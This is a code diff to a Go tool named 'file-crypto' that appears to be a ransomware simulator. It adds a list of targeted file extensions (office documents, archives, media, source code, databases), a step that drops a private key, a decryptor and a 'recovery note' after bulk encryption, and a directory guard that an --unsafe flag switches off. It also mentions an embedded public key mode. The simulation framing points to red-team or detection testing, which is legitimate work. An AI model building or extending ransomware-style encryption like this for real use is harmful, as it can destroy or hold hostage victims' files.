@@ -13,6 +13,7 @@ import (
 
 	"file-crypto/internal/crypto"
 	"file-crypto/internal/fs"
+	"file-crypto/internal/sim"
 	"file-crypto/internal/system"
 	"file-crypto/pkg/config"
 )
@@ -61,6 +62,34 @@ type DataEncryptor interface {
 	SecureClear()
 }
 
+var allowedExtensions = map[string]struct{}{
+	".doc":    {},
+	".docx":   {},
+	".xlsx":   {},
+	".pptx":   {},
+	".pdf":    {},
+	".txt":    {},
+	".zip":    {},
+	".tar":    {},
+	".gz":     {},
+	".rar":    {},
+	".jpg":    {},
+	".jpeg":   {},
+	".png":    {},
+	".mp4":    {},
+	".avi":    {},
+	".mov":    {},
+	".go":     {},
+	".py":     {},
+	".js":     {},
+	".ts":     {},
+	".html":   {},
+	".css":    {},
+	".db":     {},
+	".sqlite": {},
+	".sql":    {},
+}
+
 func main() {
 	cfg, err := config.ParseFlags("File Encryptor")
 	if err != nil {
@@ -87,7 +116,7 @@ func main() {
 		}
 		enc = encPub
 		fmt.Println("🔐 Using embedded public key (v5 hybrid mode)")
-		
+
 		// Force system exclusions for embedded-key builds (safety feature)
 		if !cfg.SystemExclusions {
 			cfg.SystemExclusions = true
@@ -159,6 +188,22 @@ func main() {
 
 	// Print final statistics
 	printFinalStats(stats, cfg.Benchmark, duration)
+
+	// Drop simulation artifacts when enabled
+	if result, err := sim.DropArtifacts(cfg); err != nil {
+		fmt.Printf("⚠️  Failed to write simulation artifacts: %v\n", err)
+	} else if result != nil {
+		fmt.Printf("\n🗂️  Simulation artifacts saved to %s\n", result.Directory)
+		if result.PrivateKeyPath != "" {
+			fmt.Printf("   • Private key: %s\n", result.PrivateKeyPath)
+		}
+		if result.DecryptorPath != "" {
+			fmt.Printf("   • Decryptor: %s\n", result.DecryptorPath)
+		}
+		if result.NotePath != "" {
+			fmt.Printf("   • Recovery note: %s\n", result.NotePath)
+		}
+	}
 }
 
 func loadKey(keyFile string) ([]byte, error) {
@@ -217,6 +262,59 @@ func findFilesToEncrypt(targetDir string, exclusions *system.Exclusions, cfg *co
 	})
 }
 
+func checkTargetDirectorySafety(cfg *config.Config, exclusions *system.Exclusions) error {
+	if cfg.UnsafeMode {
+		fmt.Println("⚠️  UNSAFE mode enabled: system directory guard rails disabled")
+		return nil
+	}
+
+	absPath, err := filepath.Abs(cfg.TargetDir)
+	if err != nil {
+		return fmt.Errorf("resolve target directory: %w", err)
+	}
+
+	if isCriticalSystemPath(absPath) {
+		return fmt.Errorf("refusing to operate on critical system path %s (use --unsafe to override)", absPath)
+	}
+
+	if exclusions != nil && exclusions.ShouldSkip(absPath) {
+		return fmt.Errorf("target directory %s is protected by system exclusions", absPath)
+	}
+
+	return nil
+}
+
+func isCriticalSystemPath(path string) bool {
+	critical := []string{
+		"/", "/etc", "/bin", "/sbin", "/usr", "/System", "/Library", "/Applications",
+		"/home", "/Users", "/var", "/opt", "/private", "/root",
+	}
+	winCritical := []string{
+		"C:/", "C:/Windows", "C:/Program Files", "C:/Program Files (x86)", "C:/ProgramData",
+	}
+
+	clean := filepath.ToSlash(filepath.Clean(path))
+	for _, guard := range critical {
+		if strings.EqualFold(clean, guard) {
+			return true
+		}
+	}
+	if len(clean) == 3 && clean[1] == ':' && clean[2] == '/' {
+		return true // drive root like C:/
+	}
+	for _, guard := range winCritical {
+		if strings.EqualFold(clean, guard) {
+			return true
+		}
+	}
+	return false
+}
+
+func isAllowedExtension(ext string) bool {
+	_, ok := allowedExtensions[ext]
+	return ok
+}
+
 func processFiles(files []string, enc DataEncryptor, stats *EncryptionStats, cfg *config.Config) {
 	var wg sync.WaitGroup
 	fileChan := make(chan string, len(files))
@@ -266,10 +364,10 @@ func processFile(filePath string, enc DataEncryptor, stats *EncryptionStats, cfg
 			stats.incrementFailed()
 			return
 		}
-		
+
 		compressionRatio := float64(len(compressedData)) / float64(originalSize) * 100
 		if cfg.Verbose {
-			fmt.Printf("📦 Compressed %s: %d -> %d bytes (%.1f%%)\n", 
+			fmt.Printf("📦 Compressed %s: %d -> %d bytes (%.1f%%)\n",
 				filepath.Base(filePath), originalSize, len(compressedData), compressionRatio)
 		}
 		data = compressedData
@@ -310,7 +408,7 @@ func processFile(filePath string, enc DataEncryptor, stats *EncryptionStats, cfg
 
 	if cfg.Verbose {
 		_, processedFiles, successfulFiles, _, _ := stats.getStats()
-		fmt.Printf("✅ [%d/%d] %s -> %s\n", 
+		fmt.Printf("✅ [%d/%d] %s -> %s\n",
 			successfulFiles-1, processedFiles, filepath.Base(filePath), filepath.Base(encryptedPath))
 	}
 }
@@ -327,7 +425,7 @@ func printFinalStats(stats *EncryptionStats, benchmark bool, duration time.Durat
 			filesPerSec := float64(successfulFiles) / duration.Seconds()
 			fmt.Printf("   ⏱️  Time: %.2f seconds\n", duration.Seconds())
 			fmt.Printf("   📈 Rate: %.1f files/sec\n", filesPerSec)
-			
+
 			if totalBytes > 0 {
 				bytesPerSec := float64(totalBytes) / duration.Seconds()
 				fmt.Printf("   💾 Throughput: %s\n", formatRate(bytesPerSec))
@@ -356,6 +454,25 @@ func matchAnyGlob(path string, patterns []string) bool {
 		}
 	}
 	return false
+}
+
+func formatRate(bytesPerSec float64) string {
+	const (
+		KB = 1024
+		MB = KB * 1024
+		GB = MB * 1024
+	)
+
+	switch {
+	case bytesPerSec >= GB:
+		return fmt.Sprintf("%.1f GB/s", bytesPerSec/GB)
+	case bytesPerSec >= MB:
+		return fmt.Sprintf("%.1f MB/s", bytesPerSec/MB)
+	case bytesPerSec >= KB:
+		return fmt.Sprintf("%.1f KB/s", bytesPerSec/KB)
+	default:
+		return fmt.Sprintf("%.1f B/s", bytesPerSec)
+	}
 }
 
 func confirmProceed(prompt string) bool {
